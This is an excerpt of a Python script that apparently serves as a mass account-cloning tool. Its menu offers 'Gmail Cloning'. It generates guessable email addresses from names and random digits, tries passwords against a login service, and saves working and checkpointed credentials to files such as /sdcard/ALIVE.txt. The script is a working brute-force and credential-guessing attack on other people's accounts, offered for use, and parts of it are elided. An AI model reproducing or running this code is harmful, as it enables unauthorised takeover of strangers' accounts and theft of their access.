...
logo= f'''
           ...
           \033[1;37m=================================
           \033[1;97m Owner  : DENV
           \033[1;97m GitHub : dnvunreachableee
           \033[1;97m Version:\033[1;92m 0.1 \033[1;97m
           \033[1;97m Status : trial
           \033[1;37m=================================
'''
...
def Hxw_Main():
    ...
    print(f"{oo(2)}Gmail Cloning")  
    print(f"{oo(3)}Create File")
    print(f"{oo(0)}Exit")
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/denv-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=denv-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=denv-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .denv')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.denv','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.denv','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.denv', 'r').read().splitlines()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mALIVE\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/ALIVE.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mdenv-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/denv-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
